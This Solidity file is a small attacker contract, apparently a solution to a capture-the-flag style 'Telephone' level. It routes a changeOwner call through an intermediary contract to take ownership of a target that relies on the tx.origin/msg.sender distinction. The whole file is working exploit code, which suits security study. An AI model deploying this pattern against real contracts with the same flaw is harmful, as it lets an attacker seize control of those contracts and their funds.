// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns(address);
}


contract TelephoneAttack {

    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        target.changeOwner(msg.sender);
    }
} 